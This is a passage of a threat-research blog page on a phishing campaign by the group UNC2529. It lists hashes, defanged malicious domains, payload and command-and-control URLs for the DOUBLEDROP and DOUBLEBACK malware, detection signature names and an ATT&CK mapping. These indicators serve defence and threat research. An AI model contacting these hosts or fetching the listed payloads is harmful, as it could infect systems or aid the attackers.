</tr><tr><td width="257" valign="top"><p>e80dc4c3e26deddcc44e66bb19b6fb58</p>
</td>
<td width="142" valign="top"><p>PDF Decoy</p>
</td>
<td width="81" valign="top"><p>1<sup>st</sup></p>
</td>
</tr><tr><td width="257" valign="top"><p>169c4d96138d3ff73097c2a9aab5b1c0</p>
</td>
<td width="142" valign="top"><p>Zip</p>
</td>
<td width="81" valign="top"><p>1<sup>st</sup></p>
</td>
</tr><tr><td width="257" valign="top"><p>e70502d020ba707095d46810fd32ee49<sup></sup></p>
</td>
<td width="142" valign="top"><p>Zip</p>
</td>
<td width="81" valign="top"><p>1<sup>st</sup></p>
</td>
</tr><tr><td width="257" valign="top"><p>62fb99dc271abc104504212157a4ba91</p>
</td>
<td width="142" valign="top"><p>Excel BIFF8 macro</p>
</td>
<td width="81" valign="top"><p>2<sup>nd</sup></p>
</td>
</tr><tr><td width="257" valign="top"><p>1d3fcb7808495bd403973a0472291da5</p>
</td>
<td width="142" valign="top"><p>PDF Decoy</p>
</td>
<td width="81" valign="top"><p>2<sup>nd</sup></p>
</td>
</tr><tr><td width="257" valign="top"><p>6a1da7ee620c638bd494f4e24f6f1ca9</p>
</td>
<td width="142" valign="top"><p>Zip</p>
</td>
<td width="81" valign="top"><p>2<sup>nd</sup></p>
</td>
</tr><tr><td width="257" valign="top"><p>a28236b43f014c15f7ad4c2b4daf1490<sup></sup></p>
</td>
<td width="257" valign="top"><p>Zip</p>
</td>
<td width="257" valign="top"><p>2<sup>nd</sup></p>
</td>
</tr><tr><td width="257" valign="top"><p>d594b3bce66b8b56881febd38aa075fb<sup></sup></p>
</td>
<td width="257" valign="top"><p>Zip</p>
</td>
<td width="257" valign="top"><p>2<sup>nd</sup></p>
</td>
</tr></tbody></table>
<p><i>Domains</i></p>
<table border="1" cellspacing="0" cellpadding="0" width="480">
<tbody><tr><td width="227" valign="top"><p><b>Dec. 2, 2020 Wave</b></p>
</td>
<td width="253" valign="top"><p><b>Dec. 11&nbsp;to 18, 2020 Wave</b></p>
</td>
</tr><tr><td width="227" valign="top"><p>adupla[.]net</p>
</td>
<td width="253" valign="top"><p>aibemarle[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>ceylonbungalows[.]net</p>
</td>
<td width="253" valign="top"><p>bestwalletforbitcoin[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>chandol[.]com</p>
</td>
<td width="253" valign="top"><p>bitcoinsacks[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>closetdeal[.]com</p>
</td>
<td width="253" valign="top"><p>digitalagencyleeds[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>daldhillon[.]com</p>
</td>
<td width="253" valign="top"><p>erbilmarriott[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>desmoncreative[.]com</p>
</td>
<td width="253" valign="top"><p>ethernetpedia[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>farmpork[.]com</p>
</td>
<td width="253" valign="top"><p>fileamazon[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>gemralph[.]com</p>
</td>
<td width="253" valign="top"><p>gamesaccommodationscotland[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>isjustlunch[.]com</p>
</td>
<td width="253" valign="top"><p>greathabibgroup[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>logicmyass[.]com</p>
</td>
<td width="253" valign="top"><p>infomarketx[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>lottoangels[.]com</p>
</td>
<td width="253" valign="top"><p>jagunconsult[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>mangoldsengers[.]com</p>
</td>
<td width="253" valign="top"><p>khodaycontrolsystem[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>oconeeveteransmemorial[.]com</p>
</td>
<td width="253" valign="top"><p>maninashop[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>scottishhandcraft[.]com</p>
</td>
<td width="253" valign="top"><p>onceprojects[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>seathisons[.]com</p>
</td>
<td width="253" valign="top"><p>simcardhosting[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>skysatcam[.]com</p>
</td>
<td width="253" valign="top"><p>stayzarentals[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>smartnhappy[.]com</p>
</td>
<td width="253" valign="top"><p>touristboardaccommodation[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>stepearn[.]com</p>
</td>
<td width="253" valign="top"><p>towncentrehotel[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>sugarmummylove[.]com</p>
</td>
<td width="253" valign="top"><p>vacuumcleanerpartsstore[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>techooze[.]com</p>
</td>
<td width="253" valign="top"><p>zmrtu[.]com</p>
</td>
</tr><tr><td width="227" valign="top"><p>tigertigerbeads[.]com</p>
</td>
<td width="253" valign="top"><p>&nbsp;</p>
</td>
</tr><tr><td width="227" valign="top"><p>totallyhealth-wealth[.]com</p>
</td>
<td width="253" valign="top"><p>&nbsp;</p>
</td>
</tr><tr><td width="227" valign="top"><p>towncenterhotel[.]com</p>
</td>
<td width="253" valign="top"><p>&nbsp;</p>
</td>
</tr><tr><td width="227" valign="top"><p>uaeworkpermit[.]com</p>
</td>
<td width="253" valign="top"><p>&nbsp;</p>
</td>
</tr></tbody></table>
<h5>DOUBLEDROP</h5>
<p><i>MD5</i></p>
<ul>
<li>4b32115487b4734f2723d461856af155</li>
<li>9e3f7e6697843075de537a8ba83da541</li>
<li>cc17e0a3a15da6a83b06b425ed79d84c</li>
</ul>
<p><i>URLs</i></p>
<ul>
<li>hxxp://p-leh[.]com/update_java.dat</li>
<li>hxxp://clanvisits[.]com/mini.dat</li>
<li>hxxps://towncentrehotels[.]com/ps1.dat</li>
</ul>
<h5>DOUBLEBACK</h5>
<p><i>MD5</i></p>
<ul>
<li>1aeecb2827babb42468d8257aa6afdeb</li>
<li>1bdf780ea6ff3abee41fe9f48d355592</li>
<li>1f285e496096168fbed415e6496a172f</li>
<li>6a3a0d3d239f04ffd0666b522b8fcbaa</li>
<li>ce02ef6efe6171cd5d1b4477e40a3989</li>
<li>fa9e686b811a1d921623947b8fd56337</li>
</ul>
<p><i>URLs</i></p>
<ul>
<li>hxxps://klikbets[.]net/admin/client.php</li>
<li>hxxps://lasartoria[.]net/admin/client.php</li>
<li>hxxps://barrel1999[.]com/admin4/client.php</li>
<li>hxxps://widestaticsinfo[.]com/admin4/client.php</li>
<li>hxxps://secureinternet20[.]com/admin5/client.php</li>
<li>hxxps://adsinfocoast[.]com/admin5/client.php</li>
</ul>
<h4>Detections</h4>
<p>FireEye detects this activity across our platforms. The following contains specific detection names that provide an indicator of exploitation or post-exploitation activities we associate with UNC2529.</p>
<table border="1" cellspacing="0" cellpadding="0" width="624">
<tbody><tr><td><p><b>Platforms</b></p>
</td>
<td><p><b>Detection Name</b></p>
</td>
</tr><tr><td width="267" valign="top"><p>Network Security</p>
<p>Email Security</p>
<p>Detection On Demand</p>
<p>Malware File Scanning</p>
<p>Malware File Storage Scanning<u></u></p>
</td>
<td width="357" valign="top"><ul>
<li>FEC_Trojan_JS_DOUBLEDRAG_1 (static)</li>
<li>FE_Trojan_JS_DOUBLEDRAG_1 (static)</li>
<li>Downloader.DOUBLEDRAG (network)</li>
<li>Downloader.JS.DOUBLEDRAG.MVX (dynamic)</li>
<li>FE_Dropper_PS1_DOUBLEDROP_1 (static)</li>
<li>FEC_Dropper_PS1_DOUBLEDROP_1 (static)</li>
<li>Dropper.PS1.DOUBLEDROP.MVX (dynamic)</li>
<li>FE_Backdoor_Win_DOUBLEBACK_1 (static)</li>
<li>FE_Backdoor_Win_DOUBLEBACK_2 (static)</li>
<li>FE_Backdoor_Win_DOUBLEBACK_3 (static)</li>
<li>FE_Backdoor_Win_DOUBLEBACK_4 (static)</li>
<li>Backdoor.Win.DOUBLEBACK (network)</li>
<li>Malware.Binary.xls</li>
</ul>
</td>
</tr><tr><td width="267" valign="top"><p>Endpoint Security</p>
</td>
<td width="357" valign="top"><p><i>Real-Time (IOC)</i></p>
<ul>
<li>POWERSHELL ENCODED REMOTE DOWNLOAD (METHODOLOGY)</li>
<li>SUSPICIOUS POWERSHELL USAGE (METHODOLOGY)</li>
<li>MALICIOUS SCRIPT CONTENT A (METHODOLOGY)</li>
<li>POWERSHELL INVOCATION FROM REGISTRY ARTIFACT (METHODOLOGY)</li>
</ul>
<p><i>Malware Protection (AV/MG)</i></p>
<ul>
<li>Generic.mg.1aeecb2827babb42</li>
<li>Generic.mg.1bdf780ea6ff3abe</li>
<li>Generic.mg.1f285e496096168f</li>
<li>Generic.mg.6a3a0d3d239f04ff</li>
<li>Generic.mg.ce02ef6efe6171cd</li>
<li>Generic.mg.fa9e686b811a1d92</li>
<li>Trojan.JS.Agent.TZP</li>
<li>Gen:Variant.Ulise.150277</li>
<li>Gen:Variant.Ulise.150283</li>
<li>Gen:Variant.Razy.799918</li>
</ul>
</td>
</tr></tbody></table>
<h4>UNC2529 MITRE ATT&amp;CK Mapping</h4>
<table border="1" cellspacing="0" cellpadding="0" width="624">
<tbody><tr><td width="311" valign="top"><p><b>ATT&amp;CK Tactic Category</b></p>
</td>
<td width="313" valign="top"><p><b>Techniques</b></p>
</td>
</tr><tr><td width="311" valign="top"><p>Resource Development</p>
</td>
<td width="313" valign="top"><ul>
<li><a href="https://attack.mitre.org/techniques/T1584">Compromise Infrastructure</a> (TT1584)</li>
<li><a href="https://attack.mitre.org/techniques/T1587">Develop Capabilities</a> (T1587)<ul>
<li><a href="https://attack.mitre.org/techniques/T1587/003">Digital Certificates</a> (T1587.003)</li>
</ul>
</li>
<li><a href="https://attack.mitre.org/techniques/T1588">Obtain Capabilities</a> (T1588)<ul>
<li><a href="https://attack.mitre.org/techniques/T1588/004">Digital Certificates</a> (T1588.004)</li>
</ul>
</li>
</ul>
</td>
</tr><tr><td width="311" valign="top"><p>Initial Access</p>
</td>
<td width="313" valign="top"><ul>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1566/">Phishing</a> (T1566)<ul>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1566/002/">Spearphishing Link</a> (T1566.002)</li>
</ul>
</li>
</ul>
</td>
</tr><tr><td width="311" valign="top"><p>Execution</p>
</td>
<td width="313" valign="top"><ul>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1204/">User Execution</a> (T1204)<ul>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1204/001/">Malicious Link</a> (T1204.001)</li>
</ul>
</li>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1059">Command and Scripting Interpreter</a> (T1059)<ul>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1059/005">Visual Basic</a> (T1059.005)</li>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1059/007">JavaScript/JScript</a> (T1059.007)</li>
</ul>
</li>
</ul>
</td>
</tr><tr><td width="311" valign="top"><p>Privilege Escalation</p>
</td>
<td width="313" valign="top"><ul>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1055">Process Injection</a> (T1055)</li>
</ul>
</td>
</tr><tr><td width="311" valign="top"><p>Defense Evasion</p>
</td>
<td width="313" valign="top"><ul>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1070">Indicator Removal on Host</a> (T1070)<ul>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1070/004">File Deletion</a> (T1070.004)</li>
</ul>
</li>
<li><a href="https://attack.mitre.org/techniques/T1027">Obfuscated Files or Information</a>&nbsp;(T1027)</li>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1055">Process Injection</a> (T1055)</li>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1112">Modify Registry</a> (T1112)</li>
</ul>
</td>
</tr><tr><td width="311" valign="top"><p>Discovery</p>
</td>
<td width="313" valign="top"><ul>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1033">System Owner/User Discovery</a> (T1033)</li>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1057">Process Discovery</a> (T1057)</li>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1082">System Information Discovery</a> (T1082)</li>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1087">Account Discovery</a> (T1087)</li>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1518">Software Discovery</a> (T1518)</li>
</ul>
</td>
</tr><tr><td width="311" valign="top"><p>Collection</p>
</td>
<td width="313" valign="top"><ul>
<li><a href="https://attack.mitre.org/techniques/T1113">Screen Capture</a>&nbsp;(T1113)</li>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1560">Archive Collected Data</a> (T1560)<ul>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1560/001">Archive via Utility</a> (T1560.001)</li>
</ul>
</li>
</ul>
</td>
</tr><tr><td width="311" valign="top"><p>Command and Control</p>
</td>
<td width="313" valign="top"><ul>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1071">Application Layer Protocol</a> (T1071)<ul>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1071/001">Web Protocols</a> (T1071.001)</li>
<li><a adhocenable="false" href="https://attack.mitre.org/techniques/T1573/002">Asymmetric Cryptography</a> (T1573.002)</li>
</ul>
</li>
</ul>
</td>
</tr></tbody></table>
<h4>Acknowledgements</h4>
<p>Thank you to Tyler McLellan, Dominik Weber, Michael Durakovich and Jeremy Kennelly for technical review of this content. In addition, thank you to Nico Paulo Yturriaga and Evan Reese for outstanding signature creation, and Ana Foreman for graphics support.</p>
</div>
<div class="clear-all"></div></div>
</div>
<div class="par prevnextbutton">
<div class="prevnext">
<div class="button">
<a id="leftBtnId" class="btn btn-B2282D" href="#"><span>Previous</span> <span>Post</span></a>
</div>
<div class="button">
<a id="rightBtnId" class="btn btn-B2282D" href="#"><span>Next</span> <span>Post</span></a>
</div>
</div>
<input type="hidden" value="/content/fireeye-www/en_US/blog/threat-research" id="categoryPathVal" name="categoryPath" />
<script>
    $(document).ready(function(){

         var prevenextHtml = $('.prevnext').html();	
         var categoryPathVal = $("#categoryPathVal").val();
            var blogsDetails;
        
            if(undefined == blogsDetails){
                    blogsDetails = [];
            }
        
        
            if(undefined != prevenextHtml){
                if(blogsDetails.length <= 0){
                     $.ajax({
                        type: "GET",
                        url: "/bin/www-blogs/read-blogentries",
                        dataType: "json",
                        data: { categoryPath: categoryPathVal} ,
                        async: false,
                        success : function(data) {
                            var totalFoundRes = data.blogs.length;
                            blogsDetails = data.blogs;
                            var currentPagePath = window.location.pathname;
                            currentPagePath = currentPagePath.split(".")[0]
                            console.log("currentPagePath :: "+currentPagePath);
        
                            for (var i = 0; i < blogsDetails.length; i++) {
                                var currentItrPath = blogsDetails[i].path;
        
                                if (currentItrPath.indexOf(currentPagePath) > -1) {
                                    console.log(blogsDetails[i-1]);
                                    console.log(blogsDetails[i+1]);

                                    if(undefined != blogsDetails[i-1] ){
										var prevPagePath = blogsDetails[i-1].path;
                                        $("#leftBtnId").attr("href",prevPagePath+".html");
                                        $("#leftBtnId").show();
                                    }else{
										$("#leftBtnId").hide();
                                    }
                                    if(undefined != blogsDetails[i+1] ){
										var nextPagePath = blogsDetails[i+1].path;  
                                    	$("#rightBtnId").attr("href",nextPagePath+".html");
                                        $("#rightBtnId").show();
                                    }else{
										$("#rightBtnId").hide();
                                    }
                                }
                            }
        
                        },
                        error : function(response){
                            console.log("Error: while connecting to servlet.");
                        }
                    });
                 }else{
                     alert("Blogs from global object :: "+blogsDetails);
                 }
            }else{
                alert("prevenextHtml :: "+prevenextHtml);
            }
    });
</script></div>
</div></div>
</div>
</div>
<div id="sidebar" class="g-u-7-24 l_g-u-1 blog-sidebar">
<div class="g-content">
<div class="sidebar reuse-blog-resources">
<div class="blog-resources">
<div class="grid-33-left parsys"><div class="rightrail section">
<div class="blog-right-rail">
<div class="bottom-bar"><div class="tab">
<span class="ficon ficon-star"></span>
<p>Promotion</p></div><div class="tab">
<span class="ficon ficon-checkbox-checked"></span>
<p>Subscribe</p></div>
<div class="tab">
<span class="ficon ficon-share"></span>
<p>Share</p></div>
<div class="tab">
<span class="ficon ficon-history2"></span>
<p>Recent</p></div>
<div class="tab">
<span class="ficon ficon-feed"></span>
<p>RSS</p></div>
</div><div class="section cta">
<div id="cq-image-jsp-/content/fireeye-www/site-content/en_US/blog-right-threat-research/jcr:content/grid-33-left/rightrail/image"><a href="/mandiant/advantage.html"><img src="/content/dam/fireeye-www/services/images/bnr-mandiant-advantage-v3-315x315.png" alt="bnr-mandiant-advantage-v3-315x315" title="bnr-mandiant-advantage-v3-315x315" class="cq-dd-image"></a></div></div><div class="section email">
<script src="https://www2.fireeye.com/js/forms2/js/forms2.min.js"></script>
<div id="mktoWrapper_3353" class="a08 bg-f2f2f2"><div class="c00 c00v0"><h3>Subscribe to Blogs</h3><p>Get email updates as new blog posts are added.</p></div><form id="mktoForm_3353"></form> <script type="text/javascript">
		if(typeof digitalData=="undefined"){digitalData={}}
        //alert(https://www2.fireeye.com+":"+848-DID-242)
        //alert("false");
		MktoForms2.loadForm("https://www2.fireeye.com", "848-DID-242", 3353,
		function(form) {
			
            if(typeof fdc.blog.initCheckboxes === "function") {
                fdc.blog.initCheckboxes(form);
            } 
			digitalData.form = {id: form.getId(),name: document.title,url: window.location.href};
			//if(typeof marketoFormViewTealiumEvent !== "undefined" && typeof utag!=="undefined"){marketoFormViewTealiumEvent(form);}
			if(typeof marketoFormViewGtmEvent !== "undefined") {
				marketoFormViewGtmEvent(form);
			}
			form.onSubmit(function(values){
                //Check if GA fields are present
                if(($("input[name='GACLIENTID__c']").length>0)&&($("input[name='GAUSERID__c']").length>0)&&($("input[name='GATRACKID__c']").length>0)&&(typeof ga!=="undefined"))
                {
                      ga(function(){ 
                          //Get tracking ID and Client ID
                           var tracker = ga.getAll()[0];
                           var trackingId = tracker.get('trackingId');
                           var clientId = tracker.get('clientId');
                           var userId = tracker.get('userId');
                           $("input[name='GACLIENTID__c'").val(clientId);
                           $("input[name='GATRACKID__c'").val(trackingId);
                           $("input[name='GAUSERID__c'").val(userId);
                       });
                 }
            
        	});
			form.onSuccess(function(values, followUpUrl) {
				//if(typeof marketoFormSubmitTealiumEvent !== "undefined"){marketoFormSubmitTealiumEvent(values);}
				if(typeof marketoFormSubmitGTMEvent !== "undefined") {
					marketoFormSubmitGTMEvent(values);
				}
				
				if(typeof fdc.blog.replaceFormWithThankYou === "function") {
					var result = fdc.blog.replaceFormWithThankYou(form,values,followUpUrl);
					if (result === false) {
						return false;
					}
				} 
				return true;
			});
			
			var adrC = typeof addMissingUTMsFromCookies !== "undefined" ? addMissingUTMsFromCookies(document.URL) : document.URL;
			form.addHiddenFields({ ADR__c: adrC,ADR_Credit__c_account: document.title,ADR_Credit__c: document.referrer });
			if(($("input[name='GACLIENTID__c']").length==0)&&($("input[name='GAUSERID__c']").length==0)&&($("input[name='GATRACKID__c']").length==0)){
				form.addHiddenFields({ GACLIENTID__c:"",GAUSERID__c:"",GATRACKID__c:""});				
			}
			
		});
	</script>
</div></div>
<div class="section share">
<h6><small>Share</small></h6>

<div class="addthis_inline_share_toolbox_7uq8"></div>
</div>
<div class="section recent">
<h6>Recent Posts</h6>

<div class="c05 c05v0"><ul>
<li class="c05_item"><p class="c05_date">04 May 2021</p><a class="c05_link" href="/blog/threat-research/2021/05/unc2529-triple-double-trifecta-phishing-campaign.html" title="The UNC2529 Triple Double: A Trifecta Phishing Campaign">The UNC2529 Triple Double: A Trifecta Phishing Campaign</a></li>

<li class="c05_item"><p class="c05_date">29 Apr 2021</p><a class="c05_link" href="/blog/threat-research/2021/04/unc2447-sombrat-and-fivehands-ransomware-sophisticated-financial-threat.html" title="UNC2447 SOMBRAT and FIVEHANDS Ransomware: A Sophisticated Financial Threat">UNC2447 SOMBRAT and FIVEHANDS Ransomware: A Sophisticated Financial Threat</a></li>

<li class="c05_item"><p class="c05_date">28 Apr 2021</p><a class="c05_link" href="/blog/threat-research/2021/04/espionage-group-unc1151-likely-conducts-ghostwriter-influence-activity.html" title="Ghostwriter Update: Cyber Espionage Group UNC1151 Likely Conducts Ghostwriter Influence Activity">Ghostwriter Update: Cyber Espionage Group UNC1151 Likely Conducts
Ghostwriter Influence Activity</a></li>
</ul></div>
</div>
<a href="/content/fireeye-www/en_US/blog/threat-research/_jcr_content.feed" target="_blank">
<div class="section rss">
<h6><small>RSS Feed: </small><small>Stay Connected</small></h6>
<span class="ficon ficon-feed"></span>
</div>
</a>
</div>
</div>
</div>
</div></div>
</div>
</div>
</div>
</div>
</main>

<div class="footer_f635 footer">

<footer id="g03-footer" class="l_footer g03 g03v0 g03v2 g03-5col">
<div class="main-footer-wrapper">

<div class="g03_list g03_list_1">
<div class="parsys"><div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>Company</strong></p></div>
<div class="footer-list section">
<ul class="g03_block"><li class="g03_item"><a href="/company.html" class="Footer">Why FireEye?</a></li>
<li class="g03_item"><a href="/customers.html" class="Footer">Customer Stories</a></li>
<li class="g03_item"><a href="/company/jobs.html" class="Footer">Careers</a></li>
<li class="g03_item"><a href="/company/compliance-certification.html" class="Footer">Certifications and Compliance</a></li>
<li class="g03_item"><a href="http://investors.fireeye.com/" target="_blank" class="Footer">Investor Relations</a></li>
<li class="g03_item"><a href="/company/supplier.html" class="Footer">Supplier Documents</a></li>
</ul></div>
</div>
</div>
<div class="g03_list g03_list_2">
<div class="parsys"><div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>News and Events</strong></p></div>
<div class="footer-list section">
<ul class="g03_block"><li class="g03_item"><a href="/company/newsroom.html" class="Footer">Newsroom</a></li>
<li class="g03_item"><a href="/company/press-releases.html" class="Footer">Press Releases</a></li>
<li class="g03_item"><a href="/company/webinars.html" class="Footer">Webinars</a></li>
<li class="g03_item"><a href="/company/events.html" class="Footer">Events</a></li>
<li class="g03_item"><a href="/company/awards.html" class="Footer">Awards and Honors</a></li>
<li class="g03_item"><a href="/company/contact-us/manage-your-communication-preference.html" class="Footer">Email Preferences</a></li>
</ul></div>
</div>
</div>
<div class="g03_list g03_list_3">
<div class="parsys"><div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>Technical Support</strong></p></div>
<div class="footer-list section">
<ul class="g03_block"><li class="g03_item"><a href="/company/incident-response.html" class="Footer">Incident?</a></li>
<li class="g03_item"><a href="/company/security.html" class="Footer">Report Security Issue</a></li>
<li class="g03_item"><a href="/support/contacts.html" class="Footer">Contact Support</a></li>
<li class="g03_item"><a href="https://csportal.fireeye.com/secur/login_portal.jsp?orgId=00D3000000063LS&portalId=06030000000pSNE" target="_blank" class="Footer">Customer Portal</a></li>
<li class="g03_item"><a href="https://community.fireeye.com/s/support-community" target="_blank" class="Footer">Communities</a></li>
<li class="g03_item"><a href="https://docs.fireeye.com" target="_blank" class="Footer">Documentation Portal</a></li>
</ul></div>
</div>
</div>
<div class="g03_list g03_list_4">
<div class="parsys"><div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>FireEye Blogs</strong></p></div>
<div class="footer-list section">
<ul class="g03_block"><li class="g03_item"><a href="/blog/threat-research.html" class="Footer">Threat Research</a></li>
<li class="g03_item"><a href="/blog/products-and-services.html" class="Footer">FireEye Stories</a></li>
<li class="g03_item"><a href="/blog/executive-perspective.html" class="Footer">Industry Perspectives</a></li>
</ul></div>
<div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>Threat Map</strong></p></div>
<div class="footer-list section">
<ul class="g03_block"><li class="g03_item"><a href="/cyber-map/threat-map.html" class="Footer">View the Latest Threats</a></li>
</ul></div>
</div>
</div>
<div class="g03_list g03_list_5">
<div class="parsys"><div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>Contact Us</strong><br>
<div class="footer-list section">
<ul class="g03_block">
<li class="g03_item"><a href="tel:+1 877-347-3393" class="contactlinks">+1 877-347-3393</a><br>&nbsp;</li>
</ul>
</div></div>
<div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>Stay Connected</strong></p></div>
<div class="followus-footer section"><h4 class="g03_title" id="g03-followus-title"> </h4><ul class="g03_block g03-s" id="g03-followus-list"><li class="g03_item g03_item-s">
<a href="https://www.linkedin.com/company/fireeye" target="_blank">
<span class="g03-s-i ficon g03-s-i-li ficon-linkedin"></span>
<span class="g03-s_label">LinkedIn</span>
</a>
</li><li class="g03_item g03_item-s">
<a href="https://twitter.com/fireeye" target="_blank">
<span class="g03-s-i ficon g03-s-i-tw ficon-twitter2"></span>
<span class="g03-s_label">Twitter</span>
</a>
</li><li class="g03_item g03_item-s">
<a href="https://www.facebook.com/FireEye" target="_blank">
<span class="g03-s-i ficon g03-s-i-fb ficon-facebook2"></span>
<span class="g03-s_label">Facebook</span>
</a>
</li><li class="g03_item g03_item-s">
<a href="https://www.youtube.com/user/FireEyeInc" target="_blank">
<span class="g03-s-i ficon g03-s-i-yt ficon-youtube2"></span>
<span class="g03-s_label">YouTube</span>
</a>
</li><li class="g03_item g03_item-s">
<a href="https://itunes.apple.com/us/podcast/eye-on-security/id1073779629?mt=2" target="_blank">
<span class="g03-s-i ficon g03-s-i-pc ficon-podcast"></span>
<span class="g03-s_label">Podcast</span>
</a>
</li></ul>
</div>
<div class="htmlpassthru section">
<div class="country-notification">
<div id="c08_modal-lang" class="c08_modal lang">
<div class="c08 c08v1">
<div class="c08_header">
<a href="#dismiss-lightbox" class="ficon ficon-close c08_dismiss" data-behavior="dismiss-c08"></a>
</div>
<div class="c08_content">
<div class="c08_body">
<div class="col FR">
<p class="type-ML">Cette page est Ã©galement disponible en franÃ§ais.</p>
<div class="button section"><a class="btn" href="/index.html">Version franÃ§aise</a></div>
</div>
<div class="col DE">
<p class="type-ML">Diese Seite ist auch auf Deutsch verfÃ¼gbar</p>
<div class="button section"><a class="btn" href="/index.html">Zur deutschen Seite wechseln</a></div>
</div>
<div class="col JP">
<p class="type-ML">æ—¥æœ¬èªžãƒšãƒ¼ã‚¸ã‚’</p>
<div class="button section"><a class="btn" href="/index.html">è¦‹ã‚‹</a></div>
</div>
<div class="col KR">
<p class="type-ML">í•´ë‹¹ íŽ˜ì´ì§€ëŠ” í•œê¸€ ë²„ì „ìœ¼ë¡œ ë³´ì‹¤ ìˆ˜ ìžˆìŠµë‹ˆë‹¤</p>
<div class="button section"><a class="btn" href="/index.html">ë°”ë¡œ ê°€ê¸°</a></div>
</div>
<hr>
<div class="col">
<p><a class="dismiss" href="#dismiss-lightbox" data-behavior="dismiss-c08">Continue viewing this page in English</a></p>
</div>
</div>
</div>
</div>
</div>
<style>
.c08_modal.lang {
    background: rgba(255,255,255,0.8);
}
.c08_modal.lang .c08_header {
    background: transparent;
    border-left: none;
}
.c08_modal.lang .c08 {
    top: 20%;
    width: 600px;
    border-radius: 12px;
    box-shadow: rgba(0, 0, 0, 0.37) 0 0 15px;
    border: 1px solid #b4b5b8;
    background-image: url("/content/dam/fireeye-www/fw/images/bg-language-select.jpg");
    background-position: right bottom;
    margin: 0 auto;
    position: relative;
    max-width: 90%;
}
.c08_modal.lang .c08_dismiss {
    color: #222;
}
.c08_modal.lang .c08_body {
    padding: 12px 50px 60px;
}
.c08_modal.lang .col {
    display: none;
}
.c08_modal.lang .col:last-child {
    display: block;
}
.c08_modal.lang .btn {
    margin-bottom: 0;
}
.c08_modal.lang hr {
    margin: 30px 80px;
}
.c08_modal.lang hr:before {
    border-bottom: none;
}
</style>
</div></div>
</div>
</div></div>
<div class="legal-footer-wrapper">
<div class="legal-footer">
<div class="g03_copyright">
<p class="g03_copyright_p">
Copyright&nbsp;&copy;&nbsp;2021&nbsp;FireEye, Inc.&nbsp;All rights reserved.&nbsp;<span class="g03-legal"><a href="/company/privacy.html">Privacy &amp; Cookies Policy</a> | <a href="/company/privacy-shield-commitment.html">Privacy Shield</a> | <a href="/company/legal.html">Legal Documentation</a></span>
</p>
</div><div class="g03_languages">
<a class="g01_options-option" href="#footer-worldwide">
<span>Site Language</span>
<span>English<span class="ficon ficon-globe"></span></span>
 </a>
<div class="option-menu" id="footer-worldwide">
<p><strong>My preferred language:</strong></p>
<ul class="g01_options_list"><li><a href="https://www.fireeye.com/blog/threat-research/2021/05/unc2529-triple-double-trifecta-phishing-campaign.html" target="_blank">English (English)</a></li>
<li><a href="https://www.fireeye.fr" target="_blank">French (FranÃ§ais)</a></li>
<li><a href="https://www.fireeye.de" target="_blank">German (Deutsch)</a></li>
<li><a href="https://www.fireeye.jp" target="_blank">Japanese (æ—¥æœ¬èªž)</a></li>
<li><a href="https://www.fireeye.kr" target="_blank">Korean (í•œêµ­ì–´)</a></li>
<li><a href="/products/international-literature.html">More languages</a></li>
</ul>
</div>
</div> </div>
</div>
</footer>
</div>
<script type="text/javascript" src="/etc/designs/fireeye-www/clientlibs_fw.min.js"></script>


<div class="htmlpassthru_c66c htmlpassthru">

<script>
function changeSlide(a) {
    if(isNaN(a)){console.log("updating i");i=2;a=2;}
	$('#uc-he01_carousel').removeClass('uc-he01_s-1 uc-he01_s-2 uc-he01_s-3 uc-he01_s-4 uc-he01_s-5');
	$('.uc-he01_sc_s, .uc-he01_c_btn').removeClass('is-active');
	$('#uc-he01_sc_s-'+(a)+', [data-target="'+(a)+'"]').addClass('is-active animate');
	window.setTimeout(function() {$('.uc-he01_sc_s, .uc-he01_c_btn').not('#uc-he01_sc_s-'+(a)).removeClass('animate');}, 1000);
	$('#uc-he01_carousel').addClass('uc-he01_s-'+(a));
}
</script></div>

<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=fewebadmin"></script>
